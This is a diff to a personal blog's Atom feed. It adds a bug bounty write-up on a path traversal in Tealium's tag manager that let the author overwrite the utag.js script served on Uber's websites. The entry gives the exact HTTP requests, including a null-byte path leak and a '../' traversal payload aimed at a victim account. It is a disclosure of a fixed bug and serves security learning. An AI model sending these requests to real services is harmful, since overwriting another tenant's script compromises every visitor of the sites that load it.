@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://zhchbin.github.io/"/>
-  <updated>2017-09-09T14:22:27.000Z</updated>
+  <updated>2018-12-03T05:59:57.221Z</updated>
   <id>http://zhchbin.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>[BBP系列三] Hijack the JS File of Uber&#39;s Website</title>
+    <link href="http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/"/>
+    <id>http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/</id>
+    <published>2018-12-03T05:11:08.000Z</published>
+    <updated>2018-12-03T05:59:57.221Z</updated>
+    
+    <content type="html"><![CDATA[<p>Again, sorry for my poor English first of all, and I will try my best to describe this bug bounty report throughly.</p><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ol><li>Almost all of Uber’s websites are loading JS file: <a href="https://tags.tiqcdn.com/utag/uber/main/prod/utag.js" target="_blank" rel="noopener">https://tags.tiqcdn.com/utag/uber/main/prod/utag.js</a> </li><li>I found that the content of utag.js is updating from <code>/data/utui/data/accounts/uber/templates/main/utag.js</code> when deploying in my.tealiumiq.com. </li><li>my.tealiumiq.com has a path traversal issue, which allow hacker to change <code>utag.js</code> of other account, including Uber’s.</li><li>This bug had beed fixed 8 months ago. Bug Bounty: $6000.</li></ol><h3 id="My-Steps"><a href="#My-Steps" class="headerlink" title="My Steps"></a>My Steps</h3><p>I like asking myself some questions when hunting for bug bounty. Looking around about <code>https://tags.tiqcdn.com/utag/uber/main/prod/utag.js</code>, I found Uber’s websites were using a third party service offered by <code>Tealium</code>. I asked myself: can I modify the content of <code>utag.js</code>? How?</p><p>I registered two account and began my journey. WARNING: DO NOT TEST IN PRODUCTION USING TARGET ACCOUNT.</p><p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg" alt=""></p><ul><li>Post <code>/urest/legacy/saveTemplate</code> with <code>profile=main%00</code> to get the path in server</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/urest/legacy/saveTemplate?utk=044925f62222711fdfec11dc6a4e7160e053d31e1a7f4774e8</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: my.tealiumiq.com</span><br><span class="line">&lt;redated&gt;</span><br><span class="line"></span><br><span class="line">account=evilaccount&amp;profile=main%00&amp;type=profile&amp;template=profile.loader&amp;code=%2F%2F+console.log(1)%3B%0A%0Aconsole.log(1)%3B</span><br></pre></td></tr></table></figure><p>Response<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"message"</span> : <span class="string">"There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/utag.js"</span>&#125;</span><br></pre></td></tr></table></figure></p><p>As you can see, the <code>utag.loader</code> template path is <code>/data/utui/data/accounts/evilaccount/templates/main/utag.js</code></p><ul><li>Change the requst body to update the revision.loader</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line">account=evilaccount&amp;profile=main%00&amp;type=revision&amp;template=revision.loader&amp;code=thisisatest&amp;revision=201804081230</span><br></pre></td></tr></table></figure><p>Response<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"message"</span> : <span class="string">"There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/201804081230/utag.js"</span>&#125;</span><br></pre></td></tr></table></figure></p><p>As you can see <code>201804081230</code> is appearing at the path. After testing, I found that I can insert <code>../</code> into this path, which means that I can change utag.js of any account, including Uber’s.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b</span> HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">account=evilaccount&amp;profile=main&amp;type=revision&amp;template=revision.loader&amp;code=thisisatest&amp;revision=201804081230/../../../../&lt;victimaccount&gt;/templates/main</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;Again, sorry for my poor English first of all, and I will try my best to describe this bug bounty report throughly.&lt;/p&gt;
+&lt;h3 id=&quot;TLDR&quot;&gt;&lt;a 
+      
+    
+    </summary>
+    
+    
+      <category term="安全" scheme="http://zhchbin.github.io/tags/%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="BBP" scheme="http://zhchbin.github.io/tags/BBP/"/>
+    
+  </entry>
   
   <entry>
     <title>[BBP系列二] Uber XSS via Cookie</title>
